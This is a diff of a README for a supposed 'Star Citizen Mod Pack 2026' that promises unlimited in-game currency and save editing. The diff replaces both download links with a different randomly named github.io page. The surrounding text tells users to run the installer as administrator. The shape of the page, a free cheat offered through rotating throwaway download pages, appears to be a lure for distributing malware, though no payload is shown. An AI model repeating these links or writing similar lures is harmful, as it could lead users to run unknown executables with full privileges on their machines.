@@ -2,7 +2,7 @@
 
 Welcome to the Star Citizen Mod Pack 2026, a comprehensive tool designed to enhance your gaming experience on Windows desktop. This mod pack includes features like save editing, unlimited aUEC, and more, all compatible with the latest Star Citizen updates for 2026. Whether you're looking to customize your ships, gain unlimited resources, or simply explore the universe without constraints, this tool has you covered.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -66,7 +66,7 @@ Ensure you run the installer as administrator and have a stable internet connect
 
 ## Download
 
-Download the latest version from GitHub: [Get it here](https://yellowtaxisave.github.io/download-page/)
+Download the latest version from GitHub: [Get it here](https://capitals-707-bringing.github.io/download-page/)
 
 ---
 
